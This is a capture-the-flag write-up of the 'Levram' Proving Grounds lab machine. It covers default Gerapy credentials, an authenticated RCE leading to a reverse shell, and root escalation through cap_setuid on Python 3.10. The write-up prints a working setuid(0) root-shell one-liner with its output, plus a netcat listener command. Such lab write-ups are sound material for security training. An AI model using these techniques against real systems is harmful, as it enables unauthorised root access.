# Levram — Proving Grounds

> [!abstract] Summary
> Levram is a Linux machine running **Gerapy** (a Scrapy management platform) on port 8000 with **default credentials** (`admin:admin`). The foothold exploits an **authenticated RCE vulnerability** in Gerapy 0.9.7 to obtain a reverse shell as the `app` user. Privilege escalation abuses a **Linux capability** — Python 3.10 has `cap_setuid=ep` set, allowing it to call `setuid(0)` and spawn a root shell directly.

**Target:** `192.168.143.24`

## Methodology

1. Full TCP port scan — identify SSH (22) and Gerapy (8000).
2. Access Gerapy web interface, log in with default credentials (`admin:admin`).
3. Exploit Gerapy 0.9.7 authenticated RCE to get a reverse shell as `app`.
4. Enumerate Linux capabilities — discover `cap_setuid` on Python 3.10.
5. Use Python to call `os.setuid(0)` and spawn `/bin/bash` as root.

## Privilege Escalation

### Linux Capabilities Enumeration

Check for binaries with special capabilities:
```
getcap -r / 2>/dev/null
```

```
app@ubuntu:~/gerapy$ getcap -r / 2>/dev/null
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

The critical finding:
```
/usr/bin/python3.10 cap_setuid=ep
```

> [!note] Linux Capabilities — `cap_setuid`
> The `cap_setuid` capability allows a process to change its user ID (UID). When set on a binary like Python, any user can run Python and call `os.setuid(0)` to become root — bypassing the need for `sudo` or SUID bits entirely. This is equivalent to having a SUID root binary. Always check `getcap -r / 2>/dev/null` during post-exploitation enumeration.

### Python cap_setuid → Root

Exploit the capability to escalate to root:
```
/usr/bin/python3.10 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

```
app@ubuntu:~/gerapy$ /usr/bin/python3.10 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
```

We are now root (uid=0).

## Lessons Learned

| Stage | Technique | Takeaway |
|-------|-----------|----------|
| Enumeration | Nmap | Python http.server on a non-standard port indicates a web framework |
| Initial Access | Default credentials | Always try `admin:admin` on management interfaces |
| Initial Access | Gerapy 0.9.7 RCE | Authenticated RCE through project manipulation |
| Privilege Escalation | Linux capabilities | `cap_setuid` on Python = instant root |

> [!tip] Key OSCP Lessons
> 1. **Always check default credentials** before searching for exploits. `admin:admin` gave us the foothold instantly.
> 2. **`getcap -r / 2>/dev/null`** should be part of your standard Linux enumeration checklist, alongside `sudo -l`, SUID binaries, and cron jobs.
> 3. **`cap_setuid` on any interpreter** (Python, Perl, Ruby) is a trivial root escalation — it allows `setuid(0)` directly.
> 4. The `rlwrap` wrapper on netcat (`rlwrap -cAr nc -lvnp`) gives you arrow-key history and line editing in reverse shells — always use it.
> 5. Note that after `os.setuid(0)`, the `gid` remains the original user's group (1000). For full root context, use `os.setgid(0)` as well, though it's not needed for the proof flag.
